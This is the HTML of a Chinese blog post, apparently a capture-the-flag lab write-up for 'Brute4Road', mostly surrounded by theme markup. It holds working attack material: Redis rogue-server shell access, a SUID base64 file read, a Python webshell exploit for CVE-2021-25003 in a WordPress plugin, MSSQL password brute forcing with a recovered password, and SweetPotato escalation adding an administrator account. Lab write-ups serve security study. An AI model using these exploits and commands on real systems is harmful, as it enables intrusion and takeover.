@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="wea5e1">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2026/02/12/brute4road春秋云镜/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Brute4Road春秋云镜">
+<meta property="og:url" content="http://example.com/2026/02/12/Brute4Road%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/index.html">
+<meta property="og:site_name" content="懒羊羊的小屋">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-02-12T13:33:24.000Z">
+<meta property="article:modified_time" content="2026-02-14T03:58:43.461Z">
+<meta property="article:author" content="wea5e1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Brute4Road春秋云镜 | 懒羊羊的小屋
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"No one but you","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                懒羊羊的小屋
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Brute4Road春秋云镜</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/lyy.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">wea5e1</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-02-12 21:33:24</span>
+        <span class="mobile">2026-02-12 21:33:24</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-02-14 11:58:43</span>
+            <span class="mobile">2026-02-14 11:58:43</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="Brute4Road春秋云镜"><a href="#Brute4Road春秋云镜" class="headerlink" title="Brute4Road春秋云镜"></a>Brute4Road春秋云镜</h1><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先感谢sun😋😋😋</span><br><span class="line">参考:https://sun1028.top/  &amp;&amp; https://xz.aliyun.com/news/13105</span><br></pre></td></tr></table></figure></div>
+
+<p>拿到靶机ip，做什么呢，直接fscan</p>
+<h2 id="flag-01"><a href="#flag-01" class="headerlink" title="flag-01"></a>flag-01</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212170240221.png"
+                      alt="image-20260212170240221"
+                ></p>
+<p>发现redis未授权访问</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212171145912.png"
+                      alt="image-20260212171145912"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/n0b0dyCN/redis-rogue-server/blob/master/</span><br></pre></td></tr></table></figure></div>
+
+<p>使用命令去弹shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212174047804.png"
+                      alt="image-20260212174047804"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212174113937.png"
+                      alt="image-20260212174113937"
+                ></p>
+<p>成功弹出来，然后去提权</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[redis@centos-web01 db]$ find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/usernetctl</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/base64</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/crontab</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/libexec/dbus-1/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br><span class="line">[redis@centos-web01 db]$</span><br><span class="line">//base64</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[redis@centos-web01 db]$ base64 &quot;/home/redis/flag/flag01&quot; | base64 -d</span><br><span class="line">base64 &quot;/home/redis/flag/flag01&quot; | base64 -d</span><br><span class="line"> ██████                    ██              ██  ███████                           ██</span><br><span class="line">░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██</span><br><span class="line">░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██</span><br><span class="line">░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████</span><br><span class="line">░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██</span><br><span class="line">░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██</span><br><span class="line">░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████</span><br><span class="line">░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░░░░░   ░░░░░░░░  ░░░░░░</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag01: flag&#123;97db100b-d78e-4829-ad87-b1444166146c&#125;</span><br><span class="line"></span><br><span class="line">Congratulations! ! !</span><br><span class="line">Guess where is the second flag?</span><br><span class="line">[redis@centos-web01 db]$</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="flag-02"><a href="#flag-02" class="headerlink" title="flag-02"></a>flag-02</h2><p>上传fscan和通信工具</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212174658995.png"
+                      alt="image-20260212174658995"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.2.7/24</span><br><span class="line">___ _</span><br><span class="line">/ _ \ ___ ___ _ __ __ _ ___| | __</span><br><span class="line">/ /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__| &lt;</span><br><span class="line">\____/ |___/\___|_| \__,_|\___|_|\_\</span><br><span class="line">fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.34 is alive</span><br><span class="line">(icmp) Target 172.22.2.7 is alive</span><br><span class="line">(icmp) Target 172.22.2.3 is alive</span><br><span class="line">(icmp) Target 172.22.2.18 is alive</span><br><span class="line">(icmp) Target 172.22.2.16 is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.2.7:80 open</span><br><span class="line">172.22.2.7:22 open</span><br><span class="line">172.22.2.7:21 open</span><br><span class="line">172.22.2.3:88 open</span><br><span class="line">172.22.2.34:139 open</span><br><span class="line">172.22.2.16:135 open</span><br><span class="line">172.22.2.34:135 open</span><br><span class="line">172.22.2.3:135 open</span><br><span class="line">172.22.2.16:80 open</span><br><span class="line">172.22.2.18:80 open</span><br><span class="line">172.22.2.18:22 open</span><br><span class="line">172.22.2.7:6379 open</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.16:139 open</span><br><span class="line">172.22.2.18:139 open</span><br><span class="line">172.22.2.3:139 open</span><br><span class="line">[*] alive ports len is: 20</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.2.3</span><br><span class="line">[-&gt;]DC</span><br><span class="line">[-&gt;]172.22.2.3</span><br><span class="line">172.22.2.7 当前机器</span><br><span class="line">172.22.2.34 XIAORANG\CLIENT01</span><br><span class="line">172.22.2.3 DC:DC.xiaorang.lab</span><br><span class="line">172.22.2.16 MSSQLSERVER.xiaorang.lab</span><br><span class="line">172.22.2.18 WORKGROUP\UBUNTU-WEB02</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.2.16</span><br><span class="line">[-&gt;]MSSQLSERVER</span><br><span class="line">[-&gt;]172.22.2.16</span><br><span class="line">[*] WebTitle http://172.22.2.7 code:200 len:4833 title:Welcome to</span><br><span class="line">CentOS</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.2.34</span><br><span class="line">[-&gt;]CLIENT01</span><br><span class="line">[-&gt;]172.22.2.34</span><br><span class="line">[*] NetBios 172.22.2.34 XIAORANG\CLIENT01</span><br><span class="line">[*] OsInfo 172.22.2.16 (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle http://172.22.2.16 code:404 len:315 title:Not Found</span><br><span class="line">[*] NetBios 172.22.2.3 [+] DC:DC.xiaorang.lab Windows Server</span><br><span class="line">2016 Datacenter 14393</span><br><span class="line">[*] NetBios 172.22.2.18 WORKGROUP\UBUNTU-WEB02</span><br><span class="line">[*] OsInfo 172.22.2.3 (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server</span><br><span class="line">2016 Datacenter 14393</span><br><span class="line">[+] ftp 172.22.2.7:21:anonymous</span><br><span class="line">[-&gt;]pub</span><br><span class="line">[*] WebTitle http://172.22.2.18 code:200 len:57738 title:又一个WordPress站</span><br><span class="line">点</span><br><span class="line">已完成 20/20</span><br><span class="line">[*] 扫描结束,耗时: 15.83239473s</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.22.2.7 当前机器</span><br><span class="line">172.22.2.34 XIAORANG\CLIENT01</span><br><span class="line">172.22.2.3 DC:DC.xiaorang.lab</span><br><span class="line">172.22.2.16 MSSQLSERVER.xiaorang.lab</span><br><span class="line">172.22.2.18 WORKGROUP\UBUNTU-WEB02</span><br></pre></td></tr></table></figure></div>
+
+<p>fscan进行信息搜集，搭建代理工具</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212175041434.png"
+                      alt="image-20260212175041434"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212175203468.png"
+                      alt="image-20260212175203468"
+                ></p>
+<p>成功访问</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212175155965.png"
+                      alt="image-20260212175155965"
+                ></p>
+<p>使用kali</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains wpscan --url http://172.22.2.18/</span><br></pre></td></tr></table></figure></div>
+
+<p>wordpress插件有洞子</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/biulove0x/CVE-2021-25003" >https://github.com/biulove0x/CVE-2021-25003<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212175605844.png"
+                      alt="image-20260212175605844"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">payload = &#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><span class="line">def encode_character_code(c: int):</span><br><span class="line">    return &#x27;&#123;:08b&#125;&#x27;.format(c).replace(&#x27;0&#x27;, &#x27;x&#x27;)</span><br><span class="line">text = &#x27;&#x27;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]</span><br><span class="line"></span><br><span class="line">destination_url = &#x27;http://172.22.2.18/&#x27;</span><br><span class="line">cmd = &#x27;ls&#x27;</span><br><span class="line">requests.get(f&quot;&#123;destination_url&#125;wp-content/plugins/wpcargo/includes/barcode.php?text=&#123;text&#125;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;)</span><br><span class="line">print(requests.post(f&quot;&#123;destination_url&#125;webshell.php?1=system&quot;, data=&#123;&quot;2&quot;: cmd&#125;).content.decode(&#x27;ascii&#x27;, &#x27;ignore&#x27;))</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212180151693.png"
+                      alt="image-20260212180151693"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212180225746.png"
+                      alt="image-20260212180225746"
+                ></p>
+<p>连接之后发现找不到去数据库看看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212180257933.png"
+                      alt="image-20260212180257933"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212180343021.png"
+                      alt="image-20260212180343021"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212180405313.png"
+                      alt="image-20260212180405313"
+                ></p>
+<p>拿下</p>
+<h2 id="flag-03"><a href="#flag-03" class="headerlink" title="flag-03"></a>flag-03</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212180509310.png"
+                      alt="image-20260212180509310"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 172.22.2.16 -m mssql -pwdf pwd.txt//爆破账号密码</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sa ElGNkOiC</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212180717940.png"
+                      alt="image-20260212180717940"
+                ></p>
+<p>土豆提权</p>
+<p>拿MDUT链接，sweetpotato提权,开Ole上传sweetpotato.exe</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212181516999.png"
+                      alt="image-20260212181516999"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net user lanyangyang qwer1234! /add&quot;</span><br><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net localgroup administrators lanyangyang /add&quot;//添加用户</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212181843922.png"
+                      alt="image-20260212181843922"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212181936176.png"
+                      alt="image-20260212181936176"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/./../../public/img/image-20260212182003014.png"
+                      alt="image-20260212182003014"
+                ></p>
